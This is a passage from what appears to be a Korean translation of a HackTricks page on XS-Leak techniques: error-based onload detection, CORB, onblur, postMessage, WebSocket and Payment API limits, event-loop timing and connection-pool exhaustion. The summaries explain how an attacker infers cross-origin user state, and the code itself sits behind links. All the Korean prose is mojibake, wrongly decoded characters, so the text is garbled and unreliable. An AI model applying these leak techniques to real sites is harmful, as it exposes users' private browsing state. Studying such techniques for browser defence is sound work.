ì²« ë²ˆì§¸ URLì´ **ì„±ê³µì ìœ¼ë¡œ ë¡œë“œ**ë˜ì—ˆë‹¤ë©´, **URLì˜ hash** ë¶€ë¶„ì„ **ë³€ê²½**í•  ë•Œ **onload** ì´ë²¤íŠ¸ëŠ” **ë‹¤ì‹œ íŠ¸ë¦¬ê±°ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ê·¸ëŸ¬ë‚˜ í˜ì´ì§€ê°€ **ë¡œë“œ**í•  ë•Œ ì–´ë–¤ ì¢…ë¥˜ì˜ **ì˜¤ë¥˜**ê°€ ë°œìƒí–ˆë‹¤ë©´, **onload** ì´ë²¤íŠ¸ëŠ” **ë‹¤ì‹œ íŠ¸ë¦¬ê±°ë©ë‹ˆë‹¤**.

ê·¸ëŸ° ë‹¤ìŒ, **ì •ìƒì ìœ¼ë¡œ** ë¡œë“œëœ í˜ì´ì§€ì™€ ì ‘ê·¼í•  ë•Œ **ì˜¤ë¥˜**ê°€ ìˆëŠ” í˜ì´ì§€ë¥¼ **êµ¬ë³„**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Javascript Execution

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**:
* **Summary:** í˜ì´ì§€ê°€ **ë¯¼ê°í•œ** ì½˜í…ì¸ ë¥¼ **ë°˜í™˜**í•˜ê±°ë‚˜ ì‚¬ìš©ìê°€ **ì œì–´í•  ìˆ˜ ìˆëŠ”** ì½˜í…ì¸ ë¥¼ ë°˜í™˜í•˜ëŠ” ê²½ìš°, ì‚¬ìš©ìëŠ” **ë¶€ì •ì ì¸ ê²½ìš°ì— ìœ íš¨í•œ JS ì½”ë“œë¥¼ ì„¤ì •**í•  ìˆ˜ ìˆìœ¼ë©°, ê° ì‹œë„ë§ˆë‹¤ **`<script>`** íƒœê·¸ ì•ˆì— ë¡œë“œí•˜ì—¬, **ë¶€ì •ì ì¸** ê²½ìš° ê³µê²©ìì˜ **ì½”ë“œ**ê°€ **ì‹¤í–‰ë˜ê³ **, **ê¸ì •ì ì¸** ê²½ìš°ì—ëŠ” **ì•„ë¬´ê²ƒë„** ì‹¤í–‰ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **Code Example:**

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code & Headers
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Summary**: **Cross-Origin Read Blocking (CORB)**ëŠ” **Spectre**ì™€ ê°™ì€ ê³µê²©ìœ¼ë¡œë¶€í„° ë³´í˜¸í•˜ê¸° ìœ„í•´ íŠ¹ì • ë¯¼ê°í•œ êµì°¨ ì¶œì²˜ ë¦¬ì†ŒìŠ¤ì˜ ë¡œë“œë¥¼ ë°©ì§€í•˜ëŠ” ë³´ì•ˆ ì¡°ì¹˜ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ê³µê²©ìëŠ” ê·¸ ë³´í˜¸ ë™ì‘ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **CORB**ì˜ ì ìš©ì„ ë°›ëŠ” ì‘ë‹µì´ `nosniff`ì™€ `2xx` ìƒíƒœ ì½”ë“œê°€ ìˆëŠ” _**CORB ë³´í˜¸**_ `Content-Type`ì„ ë°˜í™˜í•  ë•Œ, **CORB**ëŠ” ì‘ë‹µì˜ ë³¸ë¬¸ê³¼ í—¤ë”ë¥¼ ì œê±°í•©ë‹ˆë‹¤. ì´ë¥¼ ê´€ì°°í•˜ëŠ” ê³µê²©ìëŠ” **ìƒíƒœ ì½”ë“œ**(ì„±ê³µ ë˜ëŠ” ì˜¤ë¥˜ë¥¼ ë‚˜íƒ€ëƒ„)ì™€ `Content-Type`(CORBì— ì˜í•´ ë³´í˜¸ë˜ëŠ”ì§€ ì—¬ë¶€ë¥¼ ë‚˜íƒ€ëƒ„)ì˜ ì¡°í•©ì„ ì¶”ë¡ í•  ìˆ˜ ìˆì–´ ì •ë³´ ìœ ì¶œì˜ ê°€ëŠ¥ì„±ì´ ìˆìŠµë‹ˆë‹¤.
* **Code Example**:

ë” ë§ì€ ì •ë³´ì— ëŒ€í•œ ë§í¬ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤.

### onblur

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Summary**: id ë˜ëŠ” name ì†ì„±ì—ì„œ ë¯¼ê°í•œ ë°ì´í„°ë¥¼ ìœ ì¶œí•©ë‹ˆë‹¤.
* **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

**iframe** ì•ˆì— **í˜ì´ì§€ë¥¼ ë¡œë“œ**í•˜ê³  **`#id_value`**ë¥¼ ì‚¬ìš©í•˜ì—¬ í˜ì´ì§€ê°€ ì§€ì •ëœ idì˜ iframe ìš”ì†Œì— **í¬ì»¤ìŠ¤**ë¥¼ ë§ì¶”ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ **`onblur`** ì‹ í˜¸ê°€ íŠ¸ë¦¬ê±°ë˜ë©´ ID ìš”ì†Œê°€ ì¡´ì¬í•©ë‹ˆë‹¤.\
**`portal`** íƒœê·¸ë¡œ ë™ì¼í•œ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Summary**: postMessageì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ê±°ë‚˜ postMessagesì˜ ì¡´ì¬ë¥¼ ì˜¤ë¼í´ë¡œ ì‚¬ìš©í•˜ì—¬ í˜ì´ì§€ì—ì„œ ì‚¬ìš©ìì˜ ìƒíƒœë¥¼ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Code Example**: `ëª¨ë“  postMessagesë¥¼ ìˆ˜ì‹ í•˜ëŠ” ì½”ë“œ.`

ì‘ìš© í”„ë¡œê·¸ë¨ì€ ì„œë¡œ ë‹¤ë¥¸ ì¶œì²˜ ê°„ì— í†µì‹ í•˜ê¸° ìœ„í•´ [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)ë¥¼ ìì£¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ ë°©ë²•ì€ `targetOrigin` ë§¤ê°œë³€ìˆ˜ê°€ ì œëŒ€ë¡œ ì§€ì •ë˜ì§€ ì•Šìœ¼ë©´ **ë¯¼ê°í•œ ì •ë³´**ë¥¼ ìš°ì—°íˆ ë…¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ ë©”ì‹œì§€ë¥¼ ìˆ˜ì‹ í•˜ëŠ” í–‰ìœ„ ìì²´ê°€ **ì˜¤ë¼í´** ì—­í• ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, íŠ¹ì • ë©”ì‹œì§€ëŠ” ë¡œê·¸ì¸í•œ ì‚¬ìš©ìì—ê²Œë§Œ ì „ì†¡ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì´ëŸ¬í•œ ë©”ì‹œì§€ì˜ ì¡´ì¬ ì—¬ë¶€ëŠ” ì‚¬ìš©ìì˜ ìƒíƒœë‚˜ ì‹ ì›ì— ëŒ€í•œ ì •ë³´ë¥¼ ë“œëŸ¬ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ **ê°€ì¥ ì§„ë³´ëœ** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°**ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  **ìë™í™”**í•˜ì‹­ì‹œì˜¤.\
ì§€ê¸ˆ ë°”ë¡œ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## Global Limits Techniques

### WebSocket API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: WebSocket ì—°ê²° í•œê³„ë¥¼ ì†Œì§„í•˜ë©´ êµì°¨ ì¶œì²˜ í˜ì´ì§€ì˜ WebSocket ì—°ê²° ìˆ˜ê°€ ìœ ì¶œë©ë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

ëŒ€ìƒ í˜ì´ì§€ê°€ ì‚¬ìš©í•˜ëŠ” **WebSocket ì—°ê²°**ì˜ ìˆ˜ë¥¼ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ê³µê²©ìê°€ ì• í”Œë¦¬ì¼€ì´ì…˜ ìƒíƒœë¥¼ ê°ì§€í•˜ê³  WebSocket ì—°ê²° ìˆ˜ì™€ ê´€ë ¨ëœ ì •ë³´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

í•˜ë‚˜ì˜ **ì¶œì²˜**ê°€ **ìµœëŒ€ WebSocket** ì—°ê²° ê°ì²´ ìˆ˜ë¥¼ ì‚¬ìš©í•˜ê³  ìˆë‹¤ë©´, ì—°ê²° ìƒíƒœì™€ ê´€ê³„ì—†ì´ **ìƒˆ ê°ì²´ì˜ ìƒì„±ì€ JavaScript ì˜ˆì™¸ë¥¼ ë°œìƒ**ì‹œí‚µë‹ˆë‹¤. ì´ ê³µê²©ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ê³µê²©ì ì›¹ì‚¬ì´íŠ¸ëŠ” íŒì—… ë˜ëŠ” iframeì—ì„œ ëŒ€ìƒ ì›¹ì‚¬ì´íŠ¸ë¥¼ ì—´ê³ , ëŒ€ìƒ ì›¹ì´ ë¡œë“œëœ í›„ ê°€ëŠ¥í•œ ìµœëŒ€ ìˆ˜ì˜ WebSocket ì—°ê²°ì„ ìƒì„±í•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤. **ë˜ì ¸ì§„ ì˜ˆì™¸ì˜ ìˆ˜**ëŠ” **ëŒ€ìƒ ì›¹ì‚¬ì´íŠ¸** ì°½ì—ì„œ ì‚¬ìš©ëœ **WebSocket ì—°ê²°ì˜ ìˆ˜**ì…ë‹ˆë‹¤.

### Payment API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Payment Requestë¥¼ ê°ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•œ ë²ˆì— í•˜ë‚˜ë§Œ í™œì„±í™”ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

ì´ XS-LeakëŠ” ê³µê²©ìê°€ **êµì°¨ ì¶œì²˜ í˜ì´ì§€ê°€ ê²°ì œ ìš”ì²­ì„ ì‹œì‘í•  ë•Œ** ê°ì§€í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

**ê²°ì œ ìš”ì²­ì€ í•œ ë²ˆì— í•˜ë‚˜ë§Œ í™œì„±í™”**ë  ìˆ˜ ìˆê¸° ë•Œë¬¸ì—, ëŒ€ìƒ ì›¹ì‚¬ì´íŠ¸ê°€ Payment Request APIë¥¼ ì‚¬ìš©í•˜ê³  ìˆë‹¤ë©´, ì´ APIë¥¼ ì‚¬ìš©í•˜ë ¤ëŠ” ì¶”ê°€ ì‹œë„ëŠ” ì‹¤íŒ¨í•˜ê³  **JavaScript ì˜ˆì™¸**ë¥¼ ë°œìƒì‹œí‚µë‹ˆë‹¤. ê³µê²©ìëŠ” **ì£¼ê¸°ì ìœ¼ë¡œ Payment API UIë¥¼ í‘œì‹œí•˜ë ¤ê³  ì‹œë„**í•˜ì—¬ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•œ ë²ˆì˜ ì‹œë„ê°€ ì˜ˆì™¸ë¥¼ ë°œìƒì‹œí‚¤ë©´, ëŒ€ìƒ ì›¹ì‚¬ì´íŠ¸ê°€ í˜„ì¬ ì´ë¥¼ ì‚¬ìš©í•˜ê³  ìˆë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µê²©ìëŠ” UIë¥¼ ìƒì„±í•œ í›„ ì¦‰ì‹œ ë‹«ì•„ ì´ëŸ¬í•œ ì£¼ê¸°ì ì¸ ì‹œë„ë¥¼ ìˆ¨ê¸¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Summary:** ë‹¨ì¼ ìŠ¤ë ˆë“œ JS ì´ë²¤íŠ¸ ë£¨í”„ë¥¼ ì•…ìš©í•˜ì—¬ ì›¹ì˜ ì‹¤í–‰ ì‹œê°„ì„ ì¸¡ì •í•©ë‹ˆë‹¤.
* **Code Example**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScriptëŠ” [ë‹¨ì¼ ìŠ¤ë ˆë“œ ì´ë²¤íŠ¸ ë£¨í”„](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) ë™ì‹œì„± ëª¨ë¸ì—ì„œ ì‘ë™í•˜ë©°, ì´ëŠ” **í•œ ë²ˆì— í•˜ë‚˜ì˜ ì‘ì—…ë§Œ ì‹¤í–‰í•  ìˆ˜ ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤**. ì´ íŠ¹ì„±ì€ **ë‹¤ë¥¸ ì¶œì²˜ì˜ ì½”ë“œê°€ ì‹¤í–‰ë˜ëŠ” ë° ê±¸ë¦¬ëŠ” ì‹œê°„ì„ ì¸¡ì •í•˜ëŠ” ë° ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ê³µê²©ìëŠ” ê³ ì •ëœ ì†ì„±ì„ ê°€ì§„ ì´ë²¤íŠ¸ë¥¼ ì§€ì†ì ìœ¼ë¡œ ì „ì†¡í•˜ì—¬ ì´ë²¤íŠ¸ ë£¨í”„ì—ì„œ ìì‹ ì˜ ì½”ë“œì˜ ì‹¤í–‰ ì‹œê°„ì„ ì¸¡ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì´ë²¤íŠ¸ëŠ” ì´ë²¤íŠ¸ í’€ì— ë¹ˆ ê³µê°„ì´ ìˆì„ ë•Œ ì²˜ë¦¬ë©ë‹ˆë‹¤. ë‹¤ë¥¸ ì¶œì²˜ë„ ë™ì¼í•œ í’€ì— ì´ë²¤íŠ¸ë¥¼ ì „ì†¡í•˜ëŠ” ê²½ìš°, **ê³µê²©ìëŠ” ìì‹ ì˜ ì‘ì—… ì‹¤í–‰ ì§€ì—°ì„ ê´€ì°°í•˜ì—¬ ì´ëŸ¬í•œ ì™¸ë¶€ ì´ë²¤íŠ¸ê°€ ì‹¤í–‰ë˜ëŠ” ë° ê±¸ë¦¬ëŠ” ì‹œê°„ì„ ì¶”ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì§€ì—°ì— ëŒ€í•œ ì´ë²¤íŠ¸ ë£¨í”„ ëª¨ë‹ˆí„°ë§ ë°©ë²•ì€ ë‹¤ë¥¸ ì¶œì²˜ì˜ ì½”ë“œ ì‹¤í–‰ ì‹œê°„ì„ ë“œëŸ¬ë‚´ì–´ ë¯¼ê°í•œ ì •ë³´ë¥¼ ë…¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}
ì‹¤í–‰ ì‹œê°„ ì¸¡ì •ì—ì„œëŠ” **ë„¤íŠ¸ì›Œí¬ ìš”ì¸**ì„ **ì œê±°**í•˜ì—¬ **ë³´ë‹¤ ì •í™•í•œ ì¸¡ì •ê°’**ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, í˜ì´ì§€ë¥¼ ë¡œë“œí•˜ê¸° ì „ì— ì‚¬ìš©ë˜ëŠ” ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Summary:** ì›¹ ì‘ì—…ì˜ ì‹¤í–‰ ì‹œê°„ì„ ì¸¡ì •í•˜ëŠ” í•œ ê°€ì§€ ë°©ë²•ì€ ìŠ¤ë ˆë“œì˜ ì´ë²¤íŠ¸ ë£¨í”„ë¥¼ ì˜ë„ì ìœ¼ë¡œ ì°¨ë‹¨í•œ ë‹¤ìŒ **ì´ë²¤íŠ¸ ë£¨í”„ê°€ ë‹¤ì‹œ ì‚¬ìš© ê°€ëŠ¥í•´ì§€ëŠ” ë° ê±¸ë¦¬ëŠ” ì‹œê°„ì„ ì¸¡ì •í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤**. ì°¨ë‹¨ ì‘ì—…(ì˜ˆ: ê¸´ ê³„ì‚° ë˜ëŠ” ë™ê¸° API í˜¸ì¶œ)ì„ ì´ë²¤íŠ¸ ë£¨í”„ì— ì‚½ì…í•˜ê³ , í›„ì† ì½”ë“œê°€ ì‹¤í–‰ë˜ê¸° ì‹œì‘í•˜ëŠ” ë° ê±¸ë¦¬ëŠ” ì‹œê°„ì„ ëª¨ë‹ˆí„°ë§í•¨ìœ¼ë¡œì¨, ì°¨ë‹¨ ê¸°ê°„ ë™ì•ˆ ì´ë²¤íŠ¸ ë£¨í”„ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ì‘ì—…ì˜ ì§€ì† ì‹œê°„ì„ ì¶”ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê¸°ìˆ ì€ JavaScriptì˜ ì´ë²¤íŠ¸ ë£¨í”„ê°€ ë‹¨ì¼ ìŠ¤ë ˆë“œë¡œ ì‘ì—…ì„ ìˆœì°¨ì ìœ¼ë¡œ ì‹¤í–‰í•˜ëŠ” íŠ¹ì„±ì„ í™œìš©í•˜ë©°, ë™ì¼í•œ ìŠ¤ë ˆë“œë¥¼ ê³µìœ í•˜ëŠ” ë‹¤ë¥¸ ì‘ì—…ì˜ ì„±ëŠ¥ì´ë‚˜ ë™ì‘ì— ëŒ€í•œ í†µì°°ë ¥ì„ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Code Example**:

ì´ë²¤íŠ¸ ë£¨í”„ë¥¼ ì ê¸ˆìœ¼ë¡œì¨ ì‹¤í–‰ ì‹œê°„ì„ ì¸¡ì •í•˜ëŠ” ê¸°ìˆ ì˜ ì¤‘ìš”í•œ ì¥ì ì€ **ì‚¬ì´íŠ¸ ê²©ë¦¬**ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆëŠ” ì ì¬ë ¥ì…ë‹ˆë‹¤. **ì‚¬ì´íŠ¸ ê²©ë¦¬**ëŠ” ì„œë¡œ ë‹¤ë¥¸ ì›¹ì‚¬ì´íŠ¸ë¥¼ ë³„ë„ì˜ í”„ë¡œì„¸ìŠ¤ë¡œ ë¶„ë¦¬í•˜ëŠ” ë³´ì•ˆ ê¸°ëŠ¥ìœ¼ë¡œ, ì•…ì˜ì ì¸ ì‚¬ì´íŠ¸ê°€ ë‹¤ë¥¸ ì‚¬ì´íŠ¸ì˜ ë¯¼ê°í•œ ë°ì´í„°ì— ì§ì ‘ ì ‘ê·¼í•˜ëŠ” ê²ƒì„ ë°©ì§€í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ê³µìœ  ì´ë²¤íŠ¸ ë£¨í”„ë¥¼ í†µí•´ ë‹¤ë¥¸ ì¶œì²˜ì˜ ì‹¤í–‰ ì‹œê°„ì„ ì˜í–¥ì„ ë¯¸ì¹¨ìœ¼ë¡œì¨, ê³µê²©ìëŠ” í•´ë‹¹ ì¶œì²˜ì˜ í™œë™ì— ëŒ€í•œ ì •ë³´ë¥¼ ê°„ì ‘ì ìœ¼ë¡œ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë°©ë²•ì€ ë‹¤ë¥¸ ì¶œì²˜ì˜ ë°ì´í„°ì— ëŒ€í•œ ì§ì ‘ì ì¸ ì ‘ê·¼ì— ì˜ì¡´í•˜ì§€ ì•Šê³ , ì˜¤íˆë ¤ ê³µìœ  ì´ë²¤íŠ¸ ë£¨í”„ì—ì„œ í•´ë‹¹ ì¶œì²˜ì˜ í™œë™ì´ ë¯¸ì¹˜ëŠ” ì˜í–¥ì„ ê´€ì°°í•˜ì—¬ **ì‚¬ì´íŠ¸ ê²©ë¦¬**ì— ì˜í•´ ì„¤ì •ëœ ë³´í˜¸ ì¥ë²½ì„ íšŒí”¼í•©ë‹ˆë‹¤.

{% hint style="warning" %}
ì‹¤í–‰ ì‹œê°„ ì¸¡ì •ì—ì„œëŠ” **ë„¤íŠ¸ì›Œí¬ ìš”ì¸**ì„ **ì œê±°**í•˜ì—¬ **ë³´ë‹¤ ì •í™•í•œ ì¸¡ì •ê°’**ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, í˜ì´ì§€ë¥¼ ë¡œë“œí•˜ê¸° ì „ì— ì‚¬ìš©ë˜ëŠ” ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

### Connection Pool

* **Inclusion Methods**: JavaScript Requests
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Summary:** ê³µê²©ìëŠ” 1ê°œë¥¼ ì œì™¸í•œ ëª¨ë“  ì†Œì¼“ì„ ì ê·¸ê³ , ëŒ€ìƒ ì›¹ì„ ë¡œë“œí•˜ë©° ë™ì‹œì— ë‹¤ë¥¸ í˜ì´ì§€ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§ˆì§€ë§‰ í˜ì´ì§€ê°€ ë¡œë“œë˜ê¸° ì‹œì‘í•˜ëŠ” ì‹œê°„ì€ ëŒ€ìƒ í˜ì´ì§€ê°€ ë¡œë“œë˜ëŠ” ë° ê±¸ë¦° ì‹œê°„ì…ë‹ˆë‹¤.
* **Code Example**:

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

ë¸Œë¼ìš°ì €ëŠ” ì„œë²„ í†µì‹ ì„ ìœ„í•´ ì†Œì¼“ì„ ì‚¬ìš©í•˜ì§€ë§Œ, ìš´ì˜ ì²´ì œì™€ í•˜ë“œì›¨ì–´ì˜ ì œí•œëœ ìì›ìœ¼ë¡œ ì¸í•´ **ë¸Œë¼ìš°ì €ëŠ” ë™ì‹œ ì†Œì¼“ ìˆ˜ì— ì œí•œì„ ë‘ì–´ì•¼ í•©ë‹ˆë‹¤**. ê³µê²©ìëŠ” ë‹¤ìŒ ë‹¨ê³„ë¥¼ í†µí•´ ì´ ì œí•œì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

1. ë¸Œë¼ìš°ì €ì˜ ì†Œì¼“ í•œë„ë¥¼ í™•ì¸í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, 256ê°œì˜ ì „ì—­ ì†Œì¼“.
2. 255ê°œì˜ ì†Œì¼“ì„ ë‹¤ì–‘í•œ í˜¸ìŠ¤íŠ¸ì— ëŒ€í•œ 255ê°œì˜ ìš”ì²­ì„ ì‹œì‘í•˜ì—¬ ì˜¤ëœ ì‹œê°„ ë™ì•ˆ ì ìœ í•©ë‹ˆë‹¤. ì´ ìš”ì²­ì€ ì—°ê²°ì„ ì—´ì–´ ë‘ê³  ì™„ë£Œë˜ì§€ ì•Šë„ë¡ ì„¤ê³„ë©ë‹ˆë‹¤.
3. 256ë²ˆì§¸ ì†Œì¼“ì„ ì‚¬ìš©í•˜ì—¬ ëŒ€ìƒ í˜ì´ì§€ì— ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤.
4. ë‹¤ë¥¸ í˜¸ìŠ¤íŠ¸ì— 257ë²ˆì§¸ ìš”ì²­ì„ ì‹œë„í•©ë‹ˆë‹¤. ëª¨ë“  ì†Œì¼“ì´ ì‚¬ìš© ì¤‘ì´ë¯€ë¡œ(2ë‹¨ê³„ì™€ 3ë‹¨ê³„ì— ë”°ë¼) ì´ ìš”ì²­ì€ ì†Œì¼“ì´ ì‚¬ìš© ê°€ëŠ¥í•´ì§ˆ ë•Œê¹Œì§€ ëŒ€ê¸°ì—´ì— ë†“ì…ë‹ˆë‹¤. ì´ ìš”ì²­ì´ ì§„í–‰ë˜ê¸°ê¹Œì§€ì˜ ì§€ì—° ì‹œê°„ì€ ê³µê²©ìì—ê²Œ 256ë²ˆì§¸ ì†Œì¼“(ëŒ€ìƒ í˜ì´ì§€ì˜ ì†Œì¼“)ê³¼ ê´€ë ¨ëœ ë„¤íŠ¸ì›Œí¬ í™œë™ì— ëŒ€í•œ ì‹œê°„ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì´ ì¶”ë¡ ì´ ê°€ëŠ¥í•œ ì´ìœ ëŠ” 2ë‹¨ê³„ì—ì„œ 255ê°œì˜ ì†Œì¼“ì´ ì—¬ì „íˆ ì‚¬ìš© ì¤‘ì´ê¸° ë•Œë¬¸ì—, ìƒˆë¡œ ì‚¬ìš© ê°€ëŠ¥í•œ ì†Œì¼“ì€ 3ë‹¨ê³„ì—ì„œ í•´ì œëœ ì†Œì¼“ì´ì–´ì•¼ í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ 256ë²ˆì§¸ ì†Œì¼“ì´ ì‚¬ìš© ê°€ëŠ¥í•´ì§€ëŠ” ë° ê±¸ë¦° ì‹œê°„ì€ ëŒ€ìƒ í˜ì´ì§€ì— ëŒ€í•œ ìš”ì²­ì´ ì™„ë£Œë˜ëŠ” ë° ê±¸ë¦° ì‹œê°„ê³¼ ì§ì ‘ì ìœ¼ë¡œ ì—°ê²°ë©ë‹ˆë‹¤.

ë” ë§ì€ ì •ë³´: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

* **Inclusion Methods**: JavaScript Requests
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**:
